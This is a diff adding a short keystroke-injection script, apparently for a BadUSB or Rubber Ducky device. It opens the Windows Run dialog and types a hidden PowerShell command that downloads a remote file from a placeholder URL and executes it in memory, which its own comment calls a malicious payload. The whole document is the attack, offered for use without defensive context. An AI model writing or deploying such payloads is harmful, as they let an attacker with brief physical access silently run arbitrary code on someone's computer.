@@ -1,0 +1,9 @@
+REM ######## Open Run ########
+GUI r
+DELAY 100
+
+REM ######## Executing malicious payload directly through custom website ########
+STRING powershell -w hidden “IEX (New-Object Net.WebClient).DownloadString(‘URL/filename.extension’);”
+ENTER
+DELAY 600
+ENTER
